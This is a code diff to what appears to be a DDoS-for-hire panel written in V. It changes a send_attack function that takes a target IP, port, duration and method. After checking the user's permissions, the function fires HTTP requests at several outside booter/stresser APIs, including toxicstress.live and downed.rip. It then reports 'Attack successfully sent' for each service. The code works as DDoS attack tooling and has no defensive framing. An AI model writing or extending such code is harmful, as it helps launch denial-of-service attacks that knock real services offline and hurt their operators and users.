@@ -8,8 +8,6 @@ import os
 pub struct API_Attack_Info {}
 
 pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time int, method string) string {
-	println("$usr, $ip, $port, $time, $method")
-	println('test')
 	mut api_c := api_attack.API_Crud{}
 	mut cf := auth.CrudFunc{user: usr}
 	mut attk_c := auth.AttackCrud{user: usr}
@@ -19,8 +17,20 @@ pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time
 			if attk_f.validate_time() {
 				mut apis := api_c.apis_with_method(method) // this function return an array of APIs
 				// println(apis)
+				mut resp := ''
 				for api in apis { 
 					mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
+					if api.contains("orphicsecurityteam") {
+						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | OrphicSecurityTeam\r\n"
+					} else if api.contains("toxicstress.live") {
+						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | ToxicStress\r\n"
+					} else if api.contains("downed.rip") {
+						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | DownedAPI\r\n"
+					} else if api.contains("astrasecurityteam") {
+						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | AstraSecurityTeam\r\n"
+					} else {
+						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | Error Pulling API Name\r\n"
+					}
 					println(f) // print response to make sure attack is going thru
 				}
 				// attk_c.user_conn_up() // up the user on-going attk
